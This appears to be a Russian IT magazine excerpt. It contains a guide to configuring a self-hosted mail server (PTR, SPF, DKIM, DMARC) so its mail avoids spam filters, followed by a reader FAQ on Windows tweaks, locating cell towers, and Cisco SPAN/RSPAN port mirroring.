                                                         «urban.prankster»
                                            Пранкевич
                                                 prank.urban@gmail.com

Установка своего почтового сервера, как правило, не вы-
зывает особых трудностей. В Сети доступно большое ко-
личество готовых инструкций. Буквально одна команда,
и 25-й порт уже готов к работе. Весело становится, когда
отправленные письма начинают возвращаться, а получа-
тели жаловаться, что сообщения не доходят. Здесь уже
хочешь не хочешь, но придется искать причины и вникать
в технологии.

КТО ОТПРАВЛЯЕТ ПИСЬМА
Сегодня возможность привязать свой домен к сервису предлагают многие
веб-службы. Особо популярно размещение почты на Gmail или Яндексе. Все
сообщения будут идти через предоставленный ими SMTP-сервер, проверен-
ный поставщик услуг сам сформирует все необходимые заголовки и подписи,
которые позволят пройти через любой спам-фильтр. Но такой вариант не всег-
да возможен. Например, организация имеет большое количество пользова-
телей, нужны особые настройки для почты, недоступные в облачных сервисах.
Или используется свой сервер с порталом, CMS или интернет-магазин, с ко-
торых нужно отправлять сообщения.
   По умолчанию все PHP-приложения используют для отправки почты
функцию mail(), которая, в свою очередь, отправляет их через локальный
SMTP-сервер, описанный в php.ini.

[mail function]
sendmail_path = /usr/sbin/sendmail -t -i

Или в виртуальном хосте:

php_admin_value sendmail_path "/usr/sbin/sendmail -t -i
    -f webmaster@example.org"

И хотя там в 100% случаев написан sendmail, на самом деле это может быть
симлинк, а почту отсылает Postfix или Exim. Чтобы отправить почту из приложе-
ния, можно выбрать один из трех вариантов:
•  Сам движок иногда позволяет указать внешний SMTP-сервер (в дефолтных
   настройках или через плагин, в WordPress это WP Mail SMTP или Easy WP
   SMTP). Достаточно просто указать данные аккаунта, и все проблемы решены.
•  Использование программы-прокладки, которая эмулирует работу локально-
   го SMTP-сервера и отправляет сообщения через почтовый аккаунт на сто-
   роннем сервере. Здесь очень популярна SSMTP.
•  Использование своего почтового сервера. Придется, конечно, его настро-
    ить, зато больше возможностей конфигурации.

Нас интересует последний вариант. Разберем, как пробиться через антис-
пам-технологии и гарантированно доставить получателю сообщение. Сами
фильтровать спам не будем. Это тема другой статьи. В качестве подопыт-
ного SMTP-сервера выберем Postfix и Exim, они популярны на хостингах,
просты и понятны в настройках, хотя основные вопросы будут касаться всех
SMTP-серверов.

КАК НЕ ПОПАСТЬ В СПАМ
Борьба со спамом — это головная боль всех администраторов почты. Причем
в последнее время актуальна как раз обратная сторона медали: спам-фильтры
буквально зверствуют. Поэтому спам в приходящей почте практически отсут-
ствует, но вот нормальные сообщения постоянно куда-то пропадают, клиенты
и руководство нервничают, и приходится дополнительно убеждаться, что со-
общение дошло до адресата. И после установки SMTP-сервера с большой ве-
роятностью придется еще повозиться, чтобы сообщения вообще хоть куда-то
доходили. В частности, чтобы оценить настройки, следует посмотреть, достав-
ляются ли письма в ящики основных почтовых систем Gmail, Яндекс, Mail.Ru.
Обычно на этом этапе появляются первые сложности, и приходится решать
все проблемы персонально.
   Почтовые сервисы используют многоуровневую систему фильтрации спа-
ма, причем настолько серьезную и засекреченную, что о принципах не знает
даже их собственная техподдержка. И у каждого сервиса свои приоритеты.
Хотя обычно некая подсказка о причине недоставки содержится в ответном
письме сервиса. Также в анализе причин помогает сервис mail-tester.com, до-
статочно отправить письмо на указанный там адрес и затем после анализа
получить результат и перечень проблем. Некоторые из них можно проверить
и решить, еще не настраивая SMTP-сервер.





                                   Mail-tester.com — хорошее подспорье в поиске проблем

Борьба со спамом породила множество технологий. Самая старая из них —
blacklist, в который заносятся все IP и домены, занимавшиеся рассылкой спа-
ма, сюда же могут попасть открытые релеи, прокси и Dialup-адреса, использу-
емые для удаленного доступа (то есть они теоретически не должны рассылать
почту). Организованы такие blacklist по-разному. Популярностью пользуются
DNSBL (DNS blacklist) — черные списки в формате DNS, которые легко опра-
шивать. На сегодня доступно множество баз, не все они популярны и исполь-
зуются. Проблема в том, что списка для конкретного почтового сервиса нет,
сколько и какие они опрашивают — это тайна.
   Доменные имена, как и IP-адреса, сегодня могут быть «бэушными». Есть
вероятность, что до тебя ими пользовался сервис рассылки сообщений или
хост, размещенный на нем, был взломан и рассылал спам. Соответственно,
они вполне могут попасть в какой-то из DNSBL и быть проблемой. Mail.Ru от-
брасывал письма с одного IP именно из-за того, что тот находился в одном
из таких полузабытых списков, попав туда в 2010 году. Причем Mail.Ru даже
не утруждался проверять правильность SPF и DKIM. Дело сдвинулось, лишь
когда IP убрали из блек-листа.
   Проверить IP или домен можно самостоятельно, отослав DNS-запрос к вы-
бранному DNSBL-серверу при помощи утилиты dig:

$ host -tA xakep.ru.ex.dnsbl.org
Host xakep.ru.ex.dnsbl.org not found: 3(NXDOMAIN)

Но удобнее пользоваться онлайн-сервисами, проверяющими сразу в несколь-
ких базах. IP можно проверить в dnsbl.info (59 баз) или whatismyipaddress.com
(72 базы), домен, кроме того, — в mxtoolbox.com (107 баз), spamhaus.org или
 multirbl.valli.org. Если вдруг домен или IP окажется в списке, лучше сразу напи-
сать в поддержку и убрать свой адрес.





                                              Прогоняем домен по DNSBL-базам

ПРАВИЛЬНАЯ DNS
При получении сообщения удаленный SMTP-сервер анализирует прежде
всего его заголовок. Почтовая программа отправляет только From, To, Date,
Subject и X-Mailer. Они в общем понятны и просто указывают, от кого и куда
слать. Остальной заголовок формируется как SMTP-сервером, так и приложе-
нием, его отправляющим. Это, кстати, тоже нужно учитывать, потому что пись-
ма, отправляемые через Telnet, могут уходить, а с Roundcube — нет, про-
сто потому, что у них разный заголовок. Roundcube, например, подставляет
свой HELO/EHLO на основании переменной server_name или localhost, если
она не определена. Поэтому иногда нужно просто задать его явно:

$rcmail_config['smtp_helo_host'] = 'example.org';

То же касается и самописных PHP-скриптов.
При передаче письмо будет проходить минимум через два SMTP-серве-
ра, каждый из которых тоже добавляет что-то от себя в заголовок. В первую
очередь каждый сервер добавляет свой Received: from. Читать их лучше сни-
зу вверх. Самое нижнее сообщение — это сервер отправителя, самый верх-
ний — сервер получателя. Хотя на самом деле серверов может быть больше,
особенно это актуально при работе с крупными провайдерами услуг, которые,
приняв письмо, перебрасывают его дальше, или при использовании на пути
SMTP-прокси. Для анализа пути сообщения можно использовать сервис
от Google, который покажет в понятной форме все SMTP-серверы, время про-
хождения и тесты SPF, DKIM и DMARC (о них дальше).





                                                                  Путь письма

Заголовки Received отличаются, хотя есть общие правила. Типичный выглядит так:

Received: from server.example.org [1.2.3.4] (helo=server.example.org)
    by st15.provider.com with esmtps (Exim 4.80.1)
    (envelope-from <mail@example.org>)

Здесь сообщение было получено с сервера, который называется server.
example.org, имеет IP 1.2.3.4, в приветствии helo было использовано это же
имя, получил его Exim 4.80.1 сервера st15.provider.com. Сообщение отправле-
но с mail@example.org. Приняв такой заголовок, SMTP-сервер начинает про-
верять данные. Пробивает домен и IP по базам DNSBL. Проверяет наличие
MX-записи у домена. MX изначально используется для поиска почтовых сер-
веров, обслуживающих данный домен, ее наличие подтверждает, что домен
отправляет почту.
   Дальше он производит обратное разрешение имени по IP через обратный
DNS-запрос c помощью PTR-записи. То есть он узнает, сервер с каким име-
нем должен быть по адресу, с которого пришло сообщение. Такое поведение
было заложено в RFC 2505 от февраля 1999 года Anti-Spam Recommendations
for SMTP MTAs. И хотя давно признано, что обратные зоны не являются доста-
точным условием для однозначного опознавания отправителя и часто приво-
дят к ошибкам и задержкам, они все же поддерживаются. Поэтому они должны
совпасть, иначе сообщение как минимум получит минус в рейтинге, а в худшем
случае будет отброшено.
  В нашем примере за IP 1.2.3.4 должен быть закреплен server.example.org.
DNS-запись выглядит так:

1.2.3.4.in-addr.arpa. IN PTR server.example.org

Для IPv6 используется ip6.arpa. В принципе, знать об особенностях PTR не-
обязательно, так как PTR, за редким исключением, настраивает только хо-
стинг-провайдер. И если оно не устраивает, то нужно просто обратиться
в поддержку. Проверить PTR можно при помощи запроса:

$ dig -x 1.2.3.4

По факту PTR-запись после развертывания VDS может указывать на техни-
ческий домен, представленный провайдером, вроде srv01.provider.net,
в шаблоне VDS hostname вписан как Ubuntu1604 (меняется в /etc/hostname),
в HELO/EHLO SMTP-сервер пишет вообще localhost.localdomain, а пись-
мо идет от домена example.org. Вероятность доставки письма при таких усло-
виях будет стремительно приближаться к нулю. Хотя некоторые сервисы отме-
чают подобные несоответствия как ошибку и проводят полную проверку.
   Особо хочется обратить внимание, что VDS обычно имеет два IPv4 и v6. По-
этому все сказанное касается обеих версий, так как письмо к одному серверу
может идти по IPv4 и доставляться, а другой предпочитает использовать IPv6,
и письмо может не доходить до получателя. При этом очень много провайде-
ров, предоставляя IPv6, абсолютно не утруждают себя настройкой PTR-запи-
си, и ее проверка возвращает ошибку. Но Google, например, предпочитает
IPv6 и сразу отбрасывает письмо, если PTR не совпадает с именем сервера.
В ответном сообщении сервиса это выглядит так:

Our system has detected that this message does
550-5.7.1 not meet IPv6 sending guidelines regarding PTR records and
550-5.7.1 authentication.

Как вариант — можно отключить IPv6 и отправлять только по IPv4. В /etc/
postfix/main.cf Postfix для этого следует использовать всего одну строку:

inet_protocols = ipv4

После чего перезапустить сервис.

$ sudo service postfix restart

В Exim в /etc/exim/exim.conf

disable_ipv6 = true





                      Не забываем, что SMTP-сервер обычно использует IPv4 и IPv6


Идеально, когда имя сервера в заголовке и адрес отправителя сообще-
ния совпадают. Если планируется отслеживать свои рассылки через сервис
postmaster.mail.ru, то другого варианта и нет. Там это требование проверяется
жестко. Он поэтому и не видит рассылки с unisender.com и ему подобных, даже
если домен закреплен и подтвержден. Просто потому, что в unisender.com ис-
пользуется собственный SMTP-сервер со своими заголовками и письмо идет
не от example.org, а от

Received: from smtp26.emlone.com (smtp26.emlone.com [146.0.246.220])

То есть пишем провайдеру, чтобы поменял PTR на example.com, меняем
hostname и проверяем, что сервер отвечает правильным HELO/EHLO. В Postfix
за это ответственен параметр myorigin, указывающий имя домена, которое ис-
пользуется в почте, отправляемой с этой машины. По умолчанию myorigin =
$myhostname, указывающее на имя хоста. Поэтому

myhostname = example.org

Иногда используется значение $mydomain, которое по умолчанию содержит
доменную часть полного имени машины.
   Exim в HELO/EHLO использует значение переменной primary_hostname, ко-
торая по умолчанию совпадает с именем хоста. Но можно задать его вручную:

primary_hostname = example.org

И здесь есть один нюанс, о котором нужно знать. Например, домен example.
org прикреплен к Gmail, и вся работа с почтой ведется с этих аккаунтов. C VDS
менеджеры на свой @example.org ящик должны получать только сообщения
о заказе. Если настроить в SMTP-сервер EHLO example.org, то Google решит,
что над ним явно издеваются, ведь домен у него даже не будет дальше прове-
рять, просто отбросит сообщение.
   Но если на одном VDS несколько доменов, то такая схема уже будет про-
блематичной. В принципе, в RFC нет явного запрета на несколько PTR-за-
писей для одного IP, но есть уже устаревшая рекомендация IETF, в которой
расписана эта проблема и совет не делать этого в первую очередь из-за воз-
можных ошибок. Очевидно, его и придерживаются, во всяком случае, провай-
деры не хотят добавлять еще PTR-записи. В такой ситуации нужно или оста-
вить техническое имя сервера, или (лучше) выбрать один из используемых
доменов как основной и настроить PTR и hostname под него.

РАЗБИРАЕМСЯ С SPF
Изменить действующие технологии отправки почты, зародившиеся в вось-
мидесятых годах прошлого века, в глобальном масштабе уже невозможно.
Это потребовало бы колоссальных затрат как времени, так и денег. Поэтому
проблемы стали решать при помощи дополнений. Начало разработок Sender
Policy Framework (SPF) датировано июнем 2003 года, в основе стоял Менг Венг
Вонг (Meng Weng Wong) — основатель компании POBOX. Технология SPFv1
определена в RFC 4408 «Sender Policy Framework (SPF) for Authorizing Use of
Domains in E-Mail, Version 1», опубликованном в апреле 2006 года, в 2014 году
вышла новая версия — RFC 7208. Хотя крупные компании вроде Google, AOL,
Amazon, eBay, W3C объявили о ее внедрении еще в 2004-м. Суть SPF проста:
это нечто вроде персонального белого списка. Администратор почтового до-
мена с помощью специальной TXT- или SPF-записи (опционально) в DNS-зо-
не перечисляет разрешенные адреса, с которых может отправляться почта.
Сервер, получивший сообщение из этого домена, сверяет IP-адрес с SPF-за-
писью. Если адрес указан в списке разрешенных, то считается, что проверка
пройдена, и в сообщении появится новый заголовок Received-SPF: pass.
   Несмотря на то что для SPF придуман отдельный тип записи, он так и остал-
ся опциональным (при наличии поля его лучше тоже создать, хуже не будет),
TXT обязательна.

example.org TXT "v=spf1 a mx ip4:1.2.3.4 ~all"

Если домен может отправлять почту с нескольких адресов, все их прописыва-
ем здесь или указываем в MX-записи. Если VDS имеет IPv6-адрес, обязатель-
но прописываем его здесь в ipv6:. Расшифруем:
•  v=spf1 — используемая версия SPF;
•  a — прием писем от узла с IP-адресом, указанным в A-записи домена;
•  mx — подключает адреса, указанные в MX-записях;
•   all — что делать с серверами, не перечисленными в SPF. Причем все ука-
   занное после all проверяться не будет, оно должно стоять последним.

Если ip4:1.2.3.4 есть в MX или A, его можно явно не прописывать и сократить
запись до v=spf1  mx  ~all. Можно подключать другие домены. Например,
a:smtp.example.org разрешит сообщения с этого домена. Еще вариант —
использовать параметр include, подключающий хосты, разрешенные SPF-за-
писью указанного домена (например, include:_spf.yandex.net). Почти ана-
логичный параметр redirect перенаправляет проверку SPF на другой домен.
Например, redirect:example.com. Администратор устанавливает политику
SPF для домена:
•  None — означает, что в этом домене нет опубликованных SPF-записей, по-
   этому определить разрешения невозможно;
•  Neutral (?) — владелец домена явно указал, что он не хочет устанавливать
   разрешения, обрабатывается аналогично None и служит больше для ин-
   формационных целей;
•  Pass (+) — прошедшему проверку разрешено отсылать сообщения. Уста-
   новлен по умолчанию;
•   Fail (-) — клиент не уполномочен отсылать почту из этого домена, и прини-
   мающая сторона вправе пометить такое сообщение или отвергнуть. Напри-
   мер, v=spf1 -all указывает, что домен вообще не отправляет почту;
•  SoftFail (~) — отправитель не имеет права посылать сообщение, но прини-
   мающая сторона должна не отвергать сообщение, а провести дальнейшую
   проверку.

Fail и SoftFail обычно используются в all. То есть при -all все сообщения,
не попадающие под правила, следует однозначно отвергать.
   Проверить SPF-запись можно при помощи онлайн-сервисов SPF Record
Testing Tools, mxtoolbox.com или утилиты spfquery.

$ apt install spfquery
$ spfquery -ip=1.2.3.4 -sender=mail@example.org -helo=example.org

В 2004 году в MS предложили схожую с SPF технологию, названную Sender ID
и использующую DNS-записи spf2.0/pra, или spf2.0/mfrom, или spf2.0/
mfrom,pra. Проверяется MAIL FROM, а не адрес возврата. Технология в на-
стоящее время не получила широкого распространения, и MS рекомендует
при отсутствии явных записей spf2.0 рассматривать v=spf1 как эквивалент
spf2.0/mfrom,pra и использовать его при анализе. Вот, собственно, и все,
что нужно о ней знать.
  В принципе, если выполнить все рекомендации, можно уже смело отправ-
лять письма, застревать они не должны. Но некоторые сервисы требуют обя-
зательного подписывания сообщений.





                                                             Проверяем SPF
НАСТРАИВАЕМ DKIM
В основу DKIM (DomainKeys Identified Mail) легли две разработки — техноло-
гия DomainKeys от Yahoo и система Internet Identified Mail от Cisco. Новый про-
ект был подан на утверждение в качестве стандарта IETF в 2005 году. Принцип
DKIM очень прост. Каждое сообщение снабжается цифровой подписью, кото-
рая удостоверяет отправителя и гарантирует, что подписанная часть не изме-
нялась. Сам процесс напоминает работу любой системы с открытым ключом.
Владелец домена создает пару ключей — открытый и приватный. Приватный
используется на SMTP-сервере для подписи сообщения, которая передается
в заголовке DKIM-Signature. Домен указывается в поле d=, список подписан-
ных заголовков перечисляется в ключе h:

h=From:Subject:Reply-To:List-Unsubscribe:To:Message-Id:Date:MIME
    -Version:Content-Type; i=info@example.org;

Открытый ключ добавляется в TXT-поле DNS-записи и при поступлении пись-
ма запрашивается получателем, который проверяет, действительно ли под-
пись была сгенерирована для домена, указанного в адресе отправите-
ля. При положительном результате в сообщении появляется подзаголовок
Authentication-Results: dkim=pass.
   Если принимающая сторона не умеет проверять подпись, то на прохожде-
нии сообщения это никак не сказывается. Также нужно отметить, что правиль-
ный DKIM обычно не служит для антиспам-систем указанием на дальнейшее
прохождение проверок. Но по опыту его наличие обычно поднимает его рей-
тинг насколько, что он редко застревает в фильтрах. Некоторые сервисы вро-
де postmaster.mail.ru требуют обязательного наличия подписанных DKIM-со-
общений в привязанном домене, иначе статистика показываться не будет.
   DKIM подписывают сообщения основные почтовые сервисы, и если привя-
зать домен к Яндексу или Google, выполнив все инструкции, то больше ничего
делать не нужно. Яндекс подключает DKIM обычно не сразу, а через день-два.
   Настроим  Postfix, чтобы он подписывал сообщения. Будем  считать,
что он  установлен и  сконфигурирован. Далее нам понадобится  пакет
OpenDKIM.

$ sudo apt install opendkim opendkim-tools

Демон будет работать с правами opendkim:opendkim. Генерируем ключи
для селектора mail.

$ sudo mkdir -p /etc/mail/example.org
$ cd /etc/mail/example.org
$ sudo opendkim-genkey -s mail -d example.org

В текущем каталоге появятся два файла: mail.private — закрытый ключ
и mail.txt — открытый. Добавляем в DNS-запись типа TXT из mail.txt.

mail._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCS....ViwIDAQAB"

Настройки OpenDKIM в Ubuntu находятся в файле /etc/opendkim.conf. Их,
в принципе, может быть много, и могут использоваться дополнительные фай-
лы, так как один демон часто обслуживает несколько доменов. В /usr/share/
doc/opendkim/examples есть пример. Но в простом случае достаточно изме-
нить несколько параметров под свои условия.

Domain    example.org
KeyFile    /etc/mail/example.org/mail.private
Selector    mail
# По умолчанию подпись только проверяется, нужно изменить
на sv (signer, verifier)
Mode sv

После  установки демон  opendkim  слушает  сокет  /var/run/opendkim/
opendkim.sock, но при необходимости можно указать сетевой порт и интер-
фейс. После правки файла перезапускаем демон:

$ sudo service opendkim restart

Добавляем в /etc/postfix/main.cf данные сокета:

milter_default_action = accept
milter_protocol = 2
smtpd_milters = /var/run/opendkim/opendkim.sock
non_smtpd_milters = /var/run/opendkim/opendkim.sock
$ sudo service postfix restart

Коротко это все настройки.
Проверить DKIM можно с помощью утилиты opendkim-testkey:

$ opendkim-testkey -d example.org -s mail -vvv





                                                 Настройки в /etc/opendkim.conf

Мир быстро меняется, VDS переносятся на другой IP. Но антиспам-техноло-
гии, в частности SPF и DKIM, не совсем четко указывают, что делать при не-
соответствии правилам, например письмо проходит только DKIM или только
SPF. Кроме того, владелец домена не знает, если с его адресов происходит
рассылка. Эти проблемы призвана решить технология DMARC (Domain-based
Message Authentication, Reporting, and Conformance, описана в RFC 7489), ука-
зывающая, как проверять почту домена. DMARC тоже прописывается в виде
DNS-записи. Обязательны поля v (версия) и p (политика). Как минимум можно
собирать статистику по неправильным сообщениям:

_dmarc.example.org TXT "v=DMARC1; p=none; rua=mailto:mail@example.org"

Доступны три варианта политик:
•  none — без рекомендаций, регистрировать сообщения, не прошедшие про-
   верку (отчет отсылается по адресу, указанному в rua);
•  quarantine — помечать как спам;
•  reject — отклонить сообщение.

Собственно, в указанном примере и вся суть DMARC. Остальные параметры
доступны в RFC.

Если письмо не доставляется

Бывает, что все требования выполнены, а сообщения почему-то не доставля-
ются, и приходит даже глупый ответ сервера. Здесь без обращения в саппорт
проблему уже не решить.
   Способ обращения в службу поддержки у разных сервисов отличается,
найти их на сайте не всегда просто.
  В Яндекс нужно заполнить форму в конце страницы, выбрав причину обра-
щения. В Mail.Ru есть специальный ящик abuse@corp.mail.ru. Но лучше ото-
слать сообщение через веб-форму при блокировке писем, если письмо попа-
дает в спам.
   У Google нет поддержки бесплатных продуктов, в том числе и почты Gmail.
Но те, кто занимается рассылками, могут отправить запрос через специальную
форму. Может, повезет и тебе ответят. Там же есть ссылки на документацию.
   У Рамблера формы нет, проблемы нужно отсылать на abuse@rambler-co.ru.



ЗАКЛЮЧЕНИЕ
Если проделать все описанное, то о проблемах с доставкой почты можно за-
быть.
FAQ



                                        Алексей Zemond
                                            Панкратов
                                           3em0nd@gmail.com

FAQ
      ответы на вопросы
          читателей

                    (есть вопросы? шли на FAQ@GLC.RU)





КАК ВЕРНУТЬ И НАСТРОИТЬ КОНТЕКСТНОЕ МЕНЮ
ДЛЯ ОТПРАВКИ ФАЙЛА ПО ПОЧТЕ
Контекстное меню в «Проводнике» Windows — довольно удобная штука: можно
выбрать любой файл и, к примеру, отправить его по почте. Однако случается,
что отвечающий за отправку DLL портится и меню перестает работать. Сейчас
я расскажу, как справиться с этой проблемой, а также что еще интересного
можно добавить в это меню.



                                                  Пример
                                                       использования
                                                          контекстного
                                                меню





Команда «Отправить» (или Send To) знакома многим пользователям Windows.
Это весьма удобная штука, которая позволяет быстро переправлять файлы
по почте, перекидывать на флешку или создавать ярлык на рабочем столе.
Можно дополнять и своими элементами, для этого достаточно добавить ярлы-
ки по этому пути:

C:\Users\user-name\AppData\Roaming\Microsoft\Windows\SendTo

Или, еще проще, можешь открыть меню «Пуск» и написать shell:SendTo.
Немного покопавшись в документации Outlook, я нашел список поддержива-
емых команд, из которых для решения задачи с отправкой почты интересны
следующие:
•  /a — создать письмо с указанным файлом в качестве вложения;
•  /c ipm.note — создать электронное сообщение.

Полный список ключей можно глянуть на официальном сайте.
  В результате получаем такую команду:

"c:\program files\microsoft office\office15\outlook.exe" /c ipm.note /a

Создаем новый ярлык в SendTo и в качестве значения вставляем эту строку.
Теперь осталось дать ярлыку имя (например, Outlook), и ты получаешь само-
дельную отправку файлов в пару кликов. Теперь подумай, какие еще ярлыки
могут пригодиться. Можешь тем же способом отправлять файлы в проигрыва-
тель или любую другую программу. Этот трюк значительно ускоряет и упроща-
ет работу. Ну и конечно, можно поудалять ненужные пункты, к примеру запись
файла на дискету.

КАК ОТКЛЮЧИТЬ НАДОЕДЛИВЫЙ WINDOWS MEDIA PLAYER
В WINDOWS 7
Велик шанс, что Windows Media Player — это не твой выбор. По умолчанию
в нем маловато кодеков, он заметно нагружает систему или, возможно, не нра-
вится тебе по какой-то другой причине. Но даже если ты полностью заменил
его другим плеером, выгнать WMP из системы не так-то просто.
  В окне настройки программ и компонентов системы его нет, а зайти в ди-
ректорию и попытаться грохнуть какие-нибудь файлы варварским способом
Windows тебе не даст. Поэтому давай его отключим грамотно, как и задумыва-
лось разработчиками. Для этого нужно перейти в «Панель управления –> Про-
граммы и компоненты», а там найти пункт меню «Включить или отключить ком-
поненты Windows», он находится слева. В открывшемся окошке находим пункт
«Компоненты для работы с мультимедиа».





                                 Отключаем Windows Media Player под Windows 7

Раскрываем его и снимаем галки. После этого останется только перезагру-
зить систему. В этом же окошке можно отключить и другие ненужные компо-
ненты системы, будь то IE или интерфейс для приема и отправки факсов.
   Однако полностью изничтожить Windows Media Player все же не получится.
Он глубоко интегрирован в Windows, и удаление библиотек может привести
к краху всей системы. Что ж, зато, сделав все по-цивильному, ты всегда мо-
жешь вернуть WMP, если он тебе вдруг понадобится.

КАК УЗНАТЬ РАСПОЛОЖЕНИЕ ВЫШЕК СВЯЗИ
Обнаружение вышек связи — это не криминальная деятельность, а довольно
распространенная задача в отдаленных регионах и деревнях, где качество по-
крытия оставляет желать лучшего. Как понять, почему у этого столба берет
лучше, чем от той калитки? Сориентироваться тебе могут помочь следующие
инструменты и сайты.
   Из англоязычных сервисов, пожалуй,
лучше всего opensignal.com, где мож-
но выбрать оператора и необходимое
местоположение. Карта не отображает
вышки, но показывает области покры-
тия. Из русских могу порекомендовать
netmonitor.ru — в его базе содержится
немало информации о вышках операто-
ров.
   Интересны  и  некоторые  при-
ложения  для  Android.  К  примеру,
OpenSignal отображает карту сото-
вых вышек и точек Wi-Fi (еще на кар-
те помечены места с плохой связью),
имеет встроенный компас и средство
проверки скорости.
  Еще интересна утилита Netmonitor.
Она  умеет  мониторить  сети GSM
и CDMA,  показывает информацию
об уровне сигнала, содержит базу
данных сотовых вышек, поддерживает
устройства с несколькими SIM-карта-
ми, а также умеет вести лог в форма-
те CLF или KLM.
   Обрати  внимание,  у  Netmonitor
                                                               OpenSignal в действии
есть   ограничения   при   работе
на устройствах некоторых произво-
дителей. На смартфонах Motorola, LG,
Samsung, Acer и Huawei список сосе-
дей может быть пуст, а на устройствах
Samsung к тому же может не отобра-
жаться уровень сигнала.
   Также порекомендую приложение
GSM Signal Monitoring, которое позво-
ляет работать с сетями GSM, UMTS
и LTE. Оно на графике отображает из-
менение уровня сигнала и показывает
соседние соты (только в сетях GSM).
Есть монитор скорости передачи дан-
ных и возможность отслеживать ста-
тус соединения, стандарт подключе-
ния, идентификаторы соты и текущей
зоны (LAC/RNC/TAC) и уровень мощ-
ности принимаемого сигнала (RSSI,
а также RSRP для LTE).
   Зная  данные  базовой  станции,
можно пробить ее через сайт xinit.ru
и получить информацию о ее место-
нахождении. В крупных городах не по-
мешает попробовать найти народ-
ные карты с расположением вышек,
но стоит понимать, что вышки при-
                                               GSM Signal Monitoringнадлежат разным операторам. Плюс
базовые станции ставят не только
на столбы, но и на крыши домов.
  В общем, экспериментируй, применяй специализированный софт, и ты бу-
дешь знать, где уровень сигнала выше не по ощущениям, а по графикам и картам.

КАК ЗЕРКАЛИРОВАТЬ ПОРТ CISCO С ПОМОЩЬЮ ТЕХНОЛОГИИ
SPAN/RSPAN И СНИФАТЬ ТРАФИК





                                            Один из примеров использования

Во многих коммутаторах есть функция зеркалирования трафика. Скажем, с од-
ного порта на другой порт или с VLAN на порт. Соответственно, на порт, куда
зеркалируется весь трафик, ты ставишь сниффер и получаешь возможность
мониторить пакеты. В коммутаторах Cisco эта технология называется SPAN/
RSPAN — (Remote) Switch Port Analyzer.
  SPAN работает в пределах одного коммутатора, а RSPAN может зерка-
лировать и передавать трафик между коммутаторами. Понадобиться это мо-
жет для того, чтобы мониторить трафик на каком-то порту и анализировать,
что происходит в сети. Может попасться что-то подозрительное, или вдруг об-
наружатся проблемы с настройками и безопасностью. Еще SPAN может по-
мочь записывать VoIP: переправляем весь трафик VLAN Voice на нужный нам
интерфейс, а там логируем все разговоры.
   Для включения SPAN необходимо сделать две вещи: создать список источ-
ников (откуда мы будем брать трафик для анализа) и указать, куда зеркалиро-
вать данные.
   Источниками трафика могут быть порты layer 2: access port, trunk port,
etherchannel, layer 3 (routed port) и другие. Если в качестве источника указан
VLAN, то будет зеркалироваться трафик всех портов, которые находятся в дан-
ном VLAN и в настоящий момент в состоянии up. Есть возможность включать
или удалять порты из VLAN, и это мгновенно отразится на SPAN/RSPAN.
   Переходим к RSPAN. Здесь есть как сходство, так и определенные разли-
чия. К примеру, адрес источника описывается так же, а вот порт, на который
трафик будет перенаправлен, несколько иначе. Перенаправление делается
на основе специального RSPAN VLAN, а не отдельного порта, как это проис-
ходит в SPAN. Соответственно, порт, который сконфигурирован как приемник,
не может входить в один VLAN с источником. Нужно учитывать и некоторые
ограничения на порт приемника:
•  При настройке destination SPAN его конфигурация будет перезаписана,
   а соответственно, при удалении SPAN с порта конфигурация восстанавли-
   вается.
•  При настройке порта destination SPAN, если порт находится в EtherChannel,
   он будет с него удален.
•  Если порт был routed (L3), то его настройки также будут переписаны.
•  Destination port SPAN не поддерживает port security, аутентификацию 802.1x
   и private VLAN.
•  Destination port SPAN не поддерживает протоколы layer 2, такие как CDP,
   spanning tree, VTP, DTP и другие.

А вот список условий работы RSPAN:
•  Источником может быть один или более портов коммутатора или VLAN,
   но не то и другое сразу.
•  Возможна поддержка до 64 портов SPAN destination.
•  Layer 2 и layer 3 порты могут быть сконфигурированы как source port SPAN,
   так и destination port SPAN.
•  Может случиться перегрузка интерфейса, если суммарный трафик на источ-
   нике превышает возможности порта приемника.
• В пределах одной сессии SPAN нельзя доставить трафик до dest port SPAN
   из source port на локальном коммутаторе и с source RSPAN на другом ком-
   мутаторе.
•  Dest port не может быть source port, и наоборот.
•  Только одна сессия SPAN/RSPAN может доставлять трафик на единствен-
  ный порт приемника.
•  При настройке порта как приемник он перестает работать как обычный layer
   2 порт, иными словами, он предназначен только для принятия зеркалиро-
   ванного трафика.

SPAN и RSPAN поддерживают два вида трафика: исходящий и входящий.
По дефолту в SPAN/RSPAN попадают оба типа. Но можно сконфигурировать
устройство так, что будет мониториться только один из видов трафика. По де-
фолту фреймы layer 2, такие как, к примеру, CDP, spanning tree, BPDU, VTP,
DTP и PagP, игнорятся и не передаются на destination port. Но можно сделать
так, чтобы эти фреймы передавались. Для этого нужно выполнить команду

encapsulation replicate

Теперь попробуем настроить SPAN.

Router(config)#monitor session 1 source interface f0/1
Router(config)#monitor session 1 destination interface f0/24

С помощью этих двух команд мы зеркалируем трафик с первого порта комму-
татора на 24-й порт. Как видишь, все довольно просто. Если нужен только вхо-
дящий трафик, то подправим команду (для исходящего замени rx на tx):

Router(config)#monitor session 1 source interface f0/1 rx

Допустим, тебе нужно зеркалировать трафик VLAN 10 с коммутатора Router
на коммутатор Router1. В этом случае тебе понадобится RSPAN. Сначала на-
страиваем источник — в нашем случае это коммутатор Router.

Router(config)#vlan 200
Router(config-vlan)#remote-span
Router(config)#exit
Router(config)#monitor session 1 source vlan 10
Router(config)#monitor session 1 destination remote vlan 200

Остается настроить приемник на Router1.

Router1(config)#vlan 100
Router1(config-vlan)#remote-span
Router1(config)#exit
Router1(config)#monitor session 1 source remote vlan 200
Router1(config)#monitor session 1 destination interface f0/1

Теперь подключаем в первый порт Router1 и можем мониторить трафик с по-
мощью сниффера. Главное — не забывай, что поток трафика со всего VLAN
пойдет на один порт, нагрузка сильно возрастет и в случае, если трафика бу-
дет очень много, интерфейс может быть перегружен.
                                    18+





  № 12 (215)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

